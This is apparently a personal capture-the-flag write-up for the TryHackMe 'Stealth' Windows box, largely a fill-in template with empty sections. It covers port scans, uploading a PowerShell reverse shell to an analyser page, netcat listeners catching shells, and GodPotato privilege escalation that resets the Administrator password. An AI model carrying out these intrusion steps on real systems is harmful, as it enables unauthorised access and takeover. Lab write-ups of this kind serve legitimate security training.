# BOX NAME: Stealth
**LINK**: https://tryhackme.com/room/stealth

<details open><summary><ins>SUMMARY</ins></summary>

```
1. This was a particurlarly nice box. Gave me quite the headache until I found out you get other privileges if running a revshell from apache in xampp, apparantley.
2. Enumerate box. Upload obfuscated powershellscript. Gets executed automatically
3. Decode some flags, follow instructions
4. Upload a Windows php shell to get SeImpersonate privs
5. Pwn box with potatoes...

```
</details>

# REMOTE ENUMERATION:

<details><summary><ins>TARGET</ins></summary>

```
[+] IP:		10.10.120.101
[+] URL:	http://stealth.thm:8080
```
</details>
<details><summary><ins>NMAP</ins></summary>

```
# Nmap 7.94SVN scan initiated Thu Jan  4 20:10:59 2024 as: nmap -p- -Pn -oN nmap-full.log 10.10.120.101
Nmap scan report for stealth.thm (10.10.120.101)
Host is up (0.082s latency).
Not shown: 65520 filtered tcp ports (no-response)
PORT      STATE SERVICE
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
8000/tcp  open  http-alt
8080/tcp  open  http-proxy
8443/tcp  open  https-alt
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown

# Nmap done at Thu Jan  4 20:13:09 2024 -- 1 IP address (1 host up) scanned in 130.00 seconds
```

```
# Nmap 7.94SVN scan initiated Thu Jan  4 20:15:22 2024 as: nmap -Pn -A -p 139,445,3389,5985,8000,8080,8443 -oN nmap-enum.log 10.10.120.101
Nmap scan report for stealth.thm (10.10.120.101)
Host is up (0.085s latency).

PORT     STATE SERVICE       VERSION
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?

3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=HostEvasion
| Not valid before: 2024-01-03T18:38:52
|_Not valid after:  2024-07-04T18:38:52
| rdp-ntlm-info: 
|   Target_Name: HOSTEVASION
|   NetBIOS_Domain_Name: HOSTEVASION
|   NetBIOS_Computer_Name: HOSTEVASION
|   DNS_Domain_Name: HostEvasion
|   DNS_Computer_Name: HostEvasion
|   Product_Version: 10.0.17763
|_  System_Time: 2024-01-04T19:15:33+00:00
|_ssl-date: 2024-01-04T19:16:14+00:00; -2s from scanner time.

5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found

8000/tcp open  http          PHP cli server 5.5 or later
|_http-title: 404 Not Found

8080/tcp open  http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
|_http-title: PowerShell Script Analyser
|_http-open-proxy: Proxy might be redirecting requests

8443/tcp open  ssl/http      Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
|_http-title: PowerShell Script Analyser
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
|_clock-skew: mean: -2s, deviation: 0s, median: -3s
| smb2-time: 
|   date: 2024-01-04T19:15:34
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jan  4 20:16:18 2024 -- 1 IP address (1 host up) scanned in 55.48 seconds

```
</details>
<details><summary><ins>WEB</ins></summary>

whatweb-scan
```
┌──(jml㉿kali)-[~/GIT/writeups/TryHackMe/Stealth]
└─$ whatweb $URL:8080                              
http://stealth.thm:8080 [200 OK] Apache[2.4.56]
 Country[RESERVED][ZZ]
 HTML5
 HTTPServer[Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28]
 IP[10.10.120.101]
 OpenSSL[1.1.1t]
 PHP[8.0.28]
 Script
 Title[PowerShell Script Analyser]
 X-Powered-By[PHP/8.0.28]
```

nikto-scan
```

```

fuzzing
```
/uploads

```
other
```

```

</details>

<details><summary><ins>SERVICES</ins></summary>

FTP
```

```

SSH
```

```

SNMP
```

```

DNS
```

```

MAILSERVICES (POP, IMAP, SMTP)
```

```

LDAP
```

```

</details>

<details><summary><ins>Active Directory</ins></summary>

Active Directory
```

```
</details>

<details><summary><ins>SUMMARY REMOTE</ins></summary>

```
1.
2.
3.
```
</details>

# LOCAL ENUMERATION:

<details><summary><ins>FILES OF INTEREST</ins></summary>

**FILES**:
```

```

**PRIVS*:
```
PRIVILEGES INFORMATION                                                                                              
----------------------                                                                                              
                                                                                                                    
Privilege Name                Description                    State                                                  
============================= ============================== ========                                               
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled                                                
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled                                               
HOSTEVASION  

#NOT ENOUGH PRIVS
```
```
Upload a new php revers-shell and run from the apache webroot

└─$ rlwrap nc -lnvp 444
listening on [any] 444 ...
connect to [10.18.33.122] from (UNKNOWN) [10.10.140.45] 49848
SOCKET: Shell has connected! PID: 2548
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs>whoami /priv

PRIVILEGES INFORMATION                                                                                                                                                                                                                      
----------------------                                                                                                                                                                                                                      
                                                                                                                                                                                                                                            
Privilege Name                Description                               State                                                                                                                                                               
============================= ========================================= ========                                                                                                                                                            
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled                                                                                                                                                             
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

```
**SYSTEM**:

```
OS Name:                   Microsoft Windows Server 2019 Datacenter
OS Version:                10.0.17763 N/A Build 17763
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          EC2
Registered Organization:   Amazon.com
Product ID:                00430-00000-00000-AA191
Original Install Date:     3/17/2021, 2:59:06 PM
System Boot Time:          1/4/2024, 6:38:12 PM
System Manufacturer:       Xen
System Model:              HVM domU
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 63 Stepping 2 GenuineIntel ~2400 Mhz
BIOS Version:              Xen 4.11.amazon, 8/24/2006
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC) Coordinated Universal Time
Total Physical Memory:     4,096 MB
Available Physical Memory: 2,797 MB
Virtual Memory: Max Size:  4,800 MB
Virtual Memory: Available: 3,356 MB
Virtual Memory: In Use:    1,444 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: AWS PV Network Device
                                 Connection Name: Ethernet
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.10.0.1
                                 IP address(es)
                                 [01]: 10.10.120.101
                                 [02]: fe80::f520:1417:aeb7:b39e
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.

```
**OTHERS**:

```
confirmed command execution:

put "ping 10.18.33.122" inside a .ps1 and upload
sudo tcpdump -i tun0 icmp

└─$ sudo tcpdump -i tun0 icmp
[sudo] password for jml: 
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
20:39:18.421813 IP stealth.thm > 10.18.33.122: ICMP echo request, id 1, seq 1, length 40
20:39:18.421819 IP 10.18.33.122 > stealth.thm: ICMP echo reply, id 1, seq 1, length 40
20:39:19.433660 IP stealth.thm > 10.18.33.122: ICMP echo request, id 1, seq 2, length 40
20:39:19.433670 IP 10.18.33.122 > stealth.thm: ICMP echo reply, id 1, seq 2, length 40
20:39:20.448453 IP stealth.thm > 10.18.33.122: ICMP echo request, id 1, seq 3, length 40
20:39:20.448466 IP 10.18.33.122 > stealth.thm: ICMP echo reply, id 1, seq 3, length 40

```
```
Upload own custom modified powershell reverse shell. get a call back :)

┌──(jml㉿kali)-[/base/shells/powershell]
└─$ rlwrap nc -lnvp 443
listening on [any] 443 ...
connect to [10.18.33.122] from (UNKNOWN) [10.10.120.101] 49934

HOSTEVASION
evader C:\Users\evader\Documents> 

```

</details>


# LOOT

<details><summary><ins>USEFUL INFORMATION:</ins></summary>

**Kernel Info:**
*file /bin/bash ; echo -e " \\n" && lsb_release -a ; echo -e "\\n" && uname -a*
```

```


</details>

<details><summary><ins>CREDS:</ins></summary>

```
username:password
```
</details>

<details><summary><ins>HASHES:</ins></summary>

```

```
</details>

# PROOFS

<details><summary><ins>Proofs</ins></summary>

```usersflag
C:\Users\evader\Desktop\encodedflag


evader C:\Users\evader\Desktop> type encodedflag
-----BEGIN CERTIFICATE-----
WW91IGNhbiBnZXQgdGhlIGZsYWcgYnkgdmlzaXRpbmcgdGhlIGxpbmsgaHR0cDov
LzxJUF9PRl9USElTX1BDPjo4MDAwL2FzZGFzZGFkYXNkamFramRuc2Rmc2Rmcy5w
aHA=
-----END CERTIFICATE-----


base64 DEcoded string :: You can get the flag by visiting the link http://<IP_OF_THIS_PC>:8000/asdasdadasdjakjdnsdfsdfs.php
```

```
http://10.10.140.45:8000/asdasdadasdjakjdnsdfsdfs.php

"Hey, seems like you have uploaded invalid file. Blue team has been alerted.
Hint: Maybe removing the logs files for file uploads can help?"
```


Final payload:
```
#GodPotato

C:\xampp\htdocs\uploads>GodPotato-NET4.exe -cmd "cmd /c net user Administrator Nuked1234"
[*] CombaseModule: 0x140724655882240
[*] DispatchTable: 0x140724658199728
[*] UseProtseqFunction: 0x140724657577008
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] Trigger RPCSS
[*] CreateNamedPipe \\.\pipe\5c99ec97-8c88-45b4-a0bd-df3dc171fcff\pipe\epmapper
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 0000d002-1838-ffff-b5c5-55f29037118b
[*] DCOM obj OXID: 0xc3e4576c94455c5d
[*] DCOM obj OID: 0xaab7752a1bb6327b
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 532 Token:0x608  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 6644
The command completed successfully.
```

```

```

```

```

</details>